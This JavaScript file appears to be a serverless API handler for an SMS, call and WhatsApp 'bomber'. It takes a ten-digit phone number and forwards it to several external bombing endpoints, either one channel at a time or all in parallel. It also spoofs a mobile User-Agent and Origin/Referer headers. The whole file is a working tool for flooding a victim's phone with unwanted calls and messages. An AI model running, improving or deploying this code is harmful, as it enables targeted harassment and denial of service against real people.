// ===== 3 GET channels (adibhai-call-smsboomber-api) =====
const API_CALL     = "https://adibhai-call-smsboomber-api.vercel.app/api/bomb?filter=call";
const API_WHATSAPP = "https://adibhai-call-smsboomber-api.vercel.app/api/bomb?filter=whatsapp";
const API_SMS      = "https://adibhai-call-smsboomber-api.vercel.app/api/bomb?filter=sms";

// ===== 1 POST channel (original coroauto) =====
const API_CORO     = "https://coroauto-sms.vercel.app/api/bomb";

const GET_CHANNELS = {
  call:     API_CALL,
  whatsapp: API_WHATSAPP,
  sms:      API_SMS,
};

const UA = "Mozilla/5.0 (Linux; Android 13) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36";

async function fireGet(filter, number) {
  const url = `${GET_CHANNELS[filter]}&phone=${number}`;
  const r = await fetch(url, {
    method: "GET",
    headers: { "User-Agent": UA, Accept: "application/json", Connection: "keep-alive" },
    cache: "no-store",
  });
  const text = await r.text();
  return { filter, status: r.status, body: text };
}

async function fireCoro(number) {
  const payload = { number, mobile: number, phone: number, num: number };
  const r = await fetch(API_CORO, {
    method: "POST",
    headers: {
      "Content-Type": "application/json",
      "User-Agent": UA,
      Accept: "application/json",
      Origin: "https://coroauto-sms.vercel.app",
      Referer: "https://coroauto-sms.vercel.app/",
      Connection: "keep-alive",
    },
    body: JSON.stringify(payload),
    cache: "no-store",
  });
  const text = await r.text();
  return { filter: "coro", status: r.status, body: text };
}

export default async function handler(req, res) {
  res.setHeader("Access-Control-Allow-Origin", "*");
  res.setHeader("Access-Control-Allow-Methods", "POST, OPTIONS");
  res.setHeader("Access-Control-Allow-Headers", "Content-Type");
  res.setHeader("Cache-Control", "no-store");

  if (req.method === "OPTIONS") return res.status(204).end();
  if (req.method !== "POST") return res.status(405).json({ error: "POST only" });

  const body = req.body || {};
  const number = String(body.number || "").replace(/\D/g, "").slice(-10);
  const filter = String(body.filter || "sms").toLowerCase();

  if (number.length < 10) return res.status(400).json({ error: "bad number" });

  try {
    // ── ALL: fire every channel in parallel, return aggregate ──
    if (filter === "all") {
      const tasks = [
        fireGet("call", number),
        fireGet("whatsapp", number),
        fireGet("sms", number),
        fireCoro(number),
      ];
      const results = await Promise.allSettled(tasks);
      const settled = results.map((r, i) => {
        const name = ["call", "whatsapp", "sms", "coro"][i];
        if (r.status === "fulfilled") return r.value;
        return { filter: name, status: 502, body: String(r.reason?.message || r.reason) };
      });
      const ok = settled.filter(s => s.status >= 200 && s.status < 300).length;
      return res.status(200).json({
        mode: "all",
        number,
        fired: settled.length,
        ok,
        results: settled,
      });
    }

    // ── Single GET channel ──
    if (GET_CHANNELS[filter]) {
      const out = await fireGet(filter, number);
      res.setHeader("Content-Type", "application/json");
      return res.status(out.status).send(out.body);
    }

    // ── Single coro POST channel ──
    if (filter === "coro") {
      const out = await fireCoro(number);
      res.setHeader("Content-Type", "application/json");
      return res.status(out.status).send(out.body);
    }

    return res.status(400).json({ error: "bad filter" });
  } catch (e) {
    return res.status(502).json({ error: String(e.message || e) });
  }
}
